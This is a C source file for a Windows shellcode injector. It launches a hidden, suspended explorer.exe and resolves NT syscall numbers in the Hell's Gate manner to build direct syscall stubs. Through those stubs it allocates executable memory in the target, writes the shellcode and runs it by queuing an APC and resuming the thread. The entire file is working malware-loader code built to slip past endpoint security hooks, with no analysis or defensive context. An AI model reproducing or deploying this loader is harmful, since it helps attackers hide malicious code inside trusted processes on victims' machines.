#include "inject.h"
#include "hellsgate.h"
#include <stdio.h>

BOOL inject_shellcode(const uint8_t *shellcode, size_t len)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    LPVOID stub;

    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    /* CreateProcessA needs a mutable command line */
    char target[] = "explorer.exe";

    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Created suspended process PID=%lu TID=%lu\n",
           pi.dwProcessId, pi.dwThreadId);

    /* --- NtAllocateVirtualMemory --- */
    DWORD ssn = get_syscall_number("NtAllocateVirtualMemory");
    if (ssn == 0) {
        printf("[-] get_syscall_number(NtAllocateVirtualMemory) failed\n");
        goto fail;
    }
    printf("[+] NtAllocateVirtualMemory SSN = %lu\n", ssn);

    stub = create_syscall_stub(ssn);
    if (!stub)
        goto fail;

    NtAllocateVirtualMemory_t pNtAlloc = (NtAllocateVirtualMemory_t)stub;
    PVOID base_addr  = NULL;
    SIZE_T region_size = len;

    NTSTATUS status = pNtAlloc(pi.hProcess, &base_addr, 0, &region_size,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    VirtualFree(stub, 0, MEM_RELEASE);

    if (status != 0 || base_addr == NULL) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%lX\n", status);
        goto fail;
    }
    printf("[+] Allocated %zu bytes at %p\n", len, base_addr);

    /* --- NtWriteVirtualMemory --- */
    ssn = get_syscall_number("NtWriteVirtualMemory");
    if (ssn == 0) {
        printf("[-] get_syscall_number(NtWriteVirtualMemory) failed\n");
        goto fail;
    }
    printf("[+] NtWriteVirtualMemory SSN = %lu\n", ssn);

    stub = create_syscall_stub(ssn);
    if (!stub)
        goto fail;

    NtWriteVirtualMemory_t pNtWrite = (NtWriteVirtualMemory_t)stub;
    SIZE_T written = 0;

    status = pNtWrite(pi.hProcess, base_addr, (PVOID)shellcode, len, &written);
    VirtualFree(stub, 0, MEM_RELEASE);

    if (status != 0) {
        printf("[-] NtWriteVirtualMemory failed: 0x%lX\n", status);
        goto fail;
    }
    printf("[+] Wrote %zu bytes\n", (size_t)written);

    /* --- NtQueueApcThread --- */
    ssn = get_syscall_number("NtQueueApcThread");
    if (ssn == 0) {
        printf("[-] get_syscall_number(NtQueueApcThread) failed\n");
        goto fail;
    }
    printf("[+] NtQueueApcThread SSN = %lu\n", ssn);

    stub = create_syscall_stub(ssn);
    if (!stub)
        goto fail;

    NtQueueApcThread_t pNtQueueApc = (NtQueueApcThread_t)stub;

    status = pNtQueueApc(pi.hThread, base_addr, NULL, NULL, NULL);
    VirtualFree(stub, 0, MEM_RELEASE);

    if (status != 0) {
        printf("[-] NtQueueApcThread failed: 0x%lX\n", status);
        goto fail;
    }
    printf("[+] APC queued\n");

    /* Resume the thread to trigger APC execution */
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;

fail:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return FALSE;
}
